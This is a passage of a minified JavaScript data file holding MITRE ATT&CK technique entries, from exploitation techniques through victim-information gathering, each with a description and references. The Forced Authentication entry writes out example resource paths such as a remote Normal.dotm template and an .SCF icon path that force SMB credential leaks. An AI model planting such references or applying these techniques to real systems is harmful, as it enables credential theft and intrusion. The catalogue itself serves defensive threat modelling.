objects within Microsoft Office documents.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1203",external_id:sN}],tactics:[p]},{id:sO,"object-type":a,name:"Exploitation for Credential Access",description:"Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.\u003Csup\u003E\u003Ca href='https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fsecurity\u002Fms14-068.aspx'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=1515'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",external_references:[{source_name:b,external_id:sO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1212"},{url:"https:\u002F\u002Ftechnet.microsoft.com\u002Fen-us\u002Flibrary\u002Fsecurity\u002Fms14-068.aspx",description:"Microsoft. (2014, November 18). Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780). Retrieved December 23, 2015.",source_name:"Technet MS14-068"},{url:cN,description:cO,source_name:cP}],tactics:[r]},{id:sP,"object-type":a,name:"Exploitation for Defense Evasion",description:"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1518\u002F001'\u003ESecurity Software Discovery\u003C\u002Fa\u003E. The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1211",external_id:sP}],tactics:[d]},{id:sQ,"object-type":a,name:"Exploitation for Privilege Escalation",description:"Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.welivesecurity.com\u002Fwp-content\u002Fuploads\u002F2020\u002F06\u002FESET_InvisiMole.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Facidbox-rare-malware\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1105'\u003EIngress Tool Transfer\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1570'\u003ELateral Tool Transfer\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:sQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1068"},{source_name:sR,url:sS,description:sT},{source_name:sU,url:sV,description:sW},{source_name:"Microsoft Driver Block Rules",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fwindows\u002Fsecurity\u002Fthreat-protection\u002Fwindows-defender-application-control\u002Fmicrosoft-recommended-driver-block-rules",description:"Microsoft. (2020, October 15). Microsoft recommended driver block rules. Retrieved March 16, 2021."}],tactics:[u]},{id:sX,"object-type":a,name:"Exploitation of Remote Services",description:"Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1046'\u003ENetwork Service Scanning\u003C\u002Fa\u003E or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cisecurity.org\u002Fadvisory\u002Fmultiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and RDP \u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2017-0176'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E as well as applications that may be used within internal networks such as MySQL \u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2016-6662'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E and web server services. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2014-7169'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1068'\u003EExploitation for Privilege Escalation\u003C\u002Fa\u003E as a result of lateral movement exploitation as well.",external_references:[{source_name:b,external_id:sX,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1210"},{url:sH,description:sI,source_name:sJ},{url:"https:\u002F\u002Fnvd.nist.gov\u002Fvuln\u002Fdetail\u002FCVE-2017-0176",description:"National Vulnerability Database. (2017, June 22). CVE-2017-0176 Detail. Retrieved April 3, 2018.",source_name:"NVD CVE-2017-0176"},{url:sE,description:sF,source_name:sG},{url:sK,description:sL,source_name:sM}],tactics:[x]},{id:sY,"object-type":a,name:"External Remote Services",description:"Adversaries may leverage external-facing remote services to initially access and\u002For persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F006'\u003EWindows Remote Management\u003C\u002Fa\u003E can also be used externally.\n\nAccess to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2015\u002F10\u002F07\u002Fvirtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Ff\u002Fxorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fhildegard-malware-teamtnt\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:sY,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133"},{external_id:bC,source_name:c,url:bD},{url:sZ,description:s_,source_name:s$},{source_name:"Trend Micro Exposed Docker Server",url:"https:\u002F\u002Fwww.trendmicro.com\u002Fen_us\u002Fresearch\u002F20\u002Ff\u002Fxorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html",description:"Remillano II, A., et al. (2020, June 20). XORDDoS, Kaiji Variants Target Exposed Docker Servers. Retrieved April 5, 2021."},{source_name:fv,url:fw,description:fx}],tactics:[k,q]},{id:ta,"object-type":a,name:"Fallback Channels",description:"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1008",external_id:ta},{url:f,description:g,source_name:h}],tactics:[o]},{id:tb,"object-type":a,name:"File and Directory Discovery",description:"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1083'\u003EFile and Directory Discovery\u003C\u002Fa\u003E during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\u002For attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include \u003Ccode\u003Edir\u003C\u002Fcode\u003E, \u003Ccode\u003Etree\u003C\u002Fcode\u003E, \u003Ccode\u003Els\u003C\u002Fcode\u003E, \u003Ccode\u003Efind\u003C\u002Fcode\u003E, and \u003Ccode\u003Elocate\u003C\u002Fcode\u003E. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fblog.jpcert.or.jp\u002F2016\u002F01\u002Fwindows-commands-abused-by-attackers.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Custom tools may also be used to gather file and directory information and interact with the \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1106'\u003ENative API\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:tb,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1083"},{external_id:"CAPEC-127",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F127.html"},{external_id:"CAPEC-497",source_name:c,url:"https:\u002F\u002Fcapec.mitre.org\u002Fdata\u002Fdefinitions\u002F497.html"},{url:"http:\u002F\u002Fblog.jpcert.or.jp\u002F2016\u002F01\u002Fwindows-commands-abused-by-attackers.html",description:"Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016.",source_name:"Windows Commands JPCERT"}],tactics:[i]},{id:cQ,"object-type":a,name:"File and Directory Permissions Modification",description:"Adversaries may modify file or directory permissions\u002Fattributes to evade access control lists (ACLs) and access protected files.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002Fef0d2628823e8e0a0de3b08b8eacaf41cf284c086a948bdfd67f4e4373c14e4d?environmentId=100'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hybrid-analysis.com\u002Fsample\u002F22dab012c3e20e3d9291bce14a2bfc448036d3b966c6e78167f4626f5f9e38d6?environmentId=110'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and\u002For elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F008'\u003EAccessibility Features\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1037'\u003EBoot or Logon Initialization Scripts\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1546\u002F004'\u003EUnix Shell Configuration Modification\u003C\u002Fa\u003E, or tainting\u002Fhijacking other instrumental binary\u002Fconfiguration files via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1574'\u003EHijack Execution Flow\u003C\u002Fa\u003E.",external_references:[{source_name:b,external_id:cQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1222"},{url:fy,description:fz,source_name:fA},{url:fB,description:fC,source_name:fD},{url:tc,description:td,source_name:te}],tactics:[d],subtechniques:[tf,th]},{id:tj,"object-type":a,name:"Firmware Corruption",description:"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.symantec.com\u002Fsecurity-center\u002Fwriteup\u002F2000-122010-2655-99'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices could include the motherboard, hard drive, or video cards.",external_references:[{external_id:tj,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1495"},{source_name:"Symantec Chernobyl W95.CIH",url:"https:\u002F\u002Fwww.symantec.com\u002Fsecurity-center\u002Fwriteup\u002F2000-122010-2655-99",description:"Yamamura, M. (2002, April 25). W95.CIH. Retrieved April 12, 2019."},{url:tk,description:tl,source_name:tm}],tactics:[j]},{id:tn,"object-type":a,name:"Forced Authentication",description:"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fen.wikipedia.org\u002Fwiki\u002FServer_Message_Block'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.didierstevens.com\u002F2017\u002F11\u002F13\u002Fwebdav-traffic-to-malicious-sites\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Ftechnet\u002Fprodtechnol\u002FWindowsServer2003\u002FLibrary\u002FIIS\u002F4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB\u002FWebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1221'\u003ETemplate Injection\u003C\u002Fa\u003E), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fhob0\u002Fhashjacking'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E With access to the credential hash, an adversary can perform off-line \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1110'\u003EBrute Force\u003C\u002Fa\u003E cracking to gain access to plaintext credentials. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpdfs\u002Fwhite_papers\u002FRedirectToSMB.pdf'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nThere are several different ways this can occur. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fosandamalith.com\u002F2017\u002F03\u002F24\u002Fplaces-of-interest-in-stealing-netntlm-hashes\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1221'\u003ETemplate Injection\u003C\u002Fa\u003E). The document can include, for example, a request similar to \u003Ccode\u003Efile[:]\u002F\u002F[remote address]\u002FNormal.dotm\u003C\u002Fcode\u003E to trigger the SMB request. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-293A'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as \u003Ccode\u003E\\\\[remote address]\\pic.png\u003C\u002Fcode\u003E that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-293A'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:tn,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1187"},{url:fE,description:to,source_name:tp},{url:"https:\u002F\u002Fblog.didierstevens.com\u002F2017\u002F11\u002F13\u002Fwebdav-traffic-to-malicious-sites\u002F",description:"Stevens, D. (2017, November 13). WebDAV Traffic To Malicious Sites. Retrieved December 21, 2017.",source_name:"Didier Stevens WebDAV Traffic"},{url:"https:\u002F\u002Fwww.microsoft.com\u002Ftechnet\u002Fprodtechnol\u002FWindowsServer2003\u002FLibrary\u002FIIS\u002F4beddb35-0cba-424c-8b9b-a5832ad8e208.mspx",description:"Microsoft. (n.d.). Managing WebDAV Security (IIS 6.0). Retrieved December 21, 2017.",source_name:"Microsoft Managing WebDAV Security"},{url:"https:\u002F\u002Fgithub.com\u002Fhob0\u002Fhashjacking",description:"Dunning, J. (2016, August 1). Hashjacking. Retrieved December 21, 2017.",source_name:"GitHub Hashjacking"},{url:"https:\u002F\u002Fwww.cylance.com\u002Fcontent\u002Fdam\u002Fcylance\u002Fpdfs\u002Fwhite_papers\u002FRedirectToSMB.pdf",description:"Cylance. (2015, April 13). Redirect to SMB. Retrieved December 21, 2017.",source_name:"Cylance Redirect to SMB"},{url:"https:\u002F\u002Fosandamalith.com\u002F2017\u002F03\u002F24\u002Fplaces-of-interest-in-stealing-netntlm-hashes\u002F",description:"Osanda Malith Jayathissa. (2017, March 24). Places of Interest in Stealing NetNTLM Hashes. Retrieved January 26, 2018.",source_name:"Osanda Stealing NetNTLM Hashes"},{url:"https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-293A",description:"US-CERT. (2017, October 20). Alert (TA17-293A): Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors. Retrieved November 2, 2017.",source_name:"US-CERT APT Energy Oct 2017"}],tactics:[r]},{id:cR,"object-type":a,name:"Forge Web Credentials",description:"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1539'\u003ESteal Web Session Cookie\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1528'\u003ESteal Application Access Token\u003C\u002Fa\u003E, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1552\u002F004'\u003EPrivate Keys\u003C\u002Fa\u003E, or other cryptographic seed values.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fdamianh\u002Faws-adfs-credential-generator'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nOnce forged, adversaries may use these web credentials to access resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550'\u003EUse Alternate Authentication Material\u003C\u002Fa\u003E), which may bypass multi-factor and other authentication protection mechanisms.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwunderwuzzi23.github.io\u002Fblog\u002Fpassthecookie.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Funit42.paloaltonetworks.com\u002Fmac-malware-steals-cryptocurrency-exchanges-cookies\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:cR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1606"},{source_name:"GitHub AWS-ADFS-Credential-Generator",url:"https:\u002F\u002Fgithub.com\u002Fdamianh\u002Faws-adfs-credential-generator",description:"Damian Hickey. (2017, January 28). AWS-ADFS-Credential-Generator. Retrieved December 16, 2020."},{description:cS,url:cT,source_name:cU},{source_name:cV,url:cW,description:cX},{source_name:dR,url:ch,description:dS}],tactics:[r],subtechniques:[tq,ts]},{id:aR,"object-type":a,name:"Gather Victim Host Information",description:"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcybersecurity.att.com\u002Fblogs\u002Flabs-research\u002Fscanbox-a-reconnaissance-framework-used-on-watering-hole-attacks'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1195'\u003ESupply Chain Compromise\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:aR,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1592"},{source_name:aw,url:ax,description:ay}],tactics:[l],subtechniques:[tu,tw,ty,tA]},{id:bE,"object-type":a,name:"Gather Victim Identity Information",description:"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.\n\nAdversaries may gather this information in various ways, such as direct elicitation via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001'\u003ESocial Media\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.opm.gov\u002Fcybersecurity\u002Fcybersecurity-incidents\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.theregister.com\u002F2017\u002F09\u002F26\u002Fdeloitte_leak_github_and_google\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.theregister.com\u002F2015\u002F02\u002F28\u002Fuber_subpoenas_github_for_hacker_details\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flabs.detectify.com\u002F2016\u002F04\u002F28\u002Fslack-bot-token-leakage-exposing-business-critical-information\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.forbes.com\u002Fsites\u002Frunasandvik\u002F2014\u002F01\u002F14\u002Fattackers-scrape-github-for-cloud-service-credentials-hijack-account-to-mine-virtual-currency\u002F#242c479d3196'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fdxa4481\u002FtruffleHog'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002Fmichenriksen\u002Fgitrob'\u003E[7]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.cnet.com\u002Fnews\u002Fmassive-breach-leaks-773-million-emails-21-million-passwords\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Gathering this information may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E).",external_references:[{source_name:b,external_id:bE,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1589"},{source_name:tC,url:tD,description:tE},{source_name:tF,url:tG,description:tH},{source_name:tI,url:tJ,description:tK},{source_name:tL,url:tM,description:tN},{source_name:tO,url:tP,description:tQ},{source_name:tR,url:tS,description:tT},{source_name:tU,url:tV,description:tW},{source_name:fF,url:fG,description:fH}],tactics:[l],subtechniques:[tX,tZ,t$]},{id:_,"object-type":a,name:"Gather Victim Network Information",description:"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca 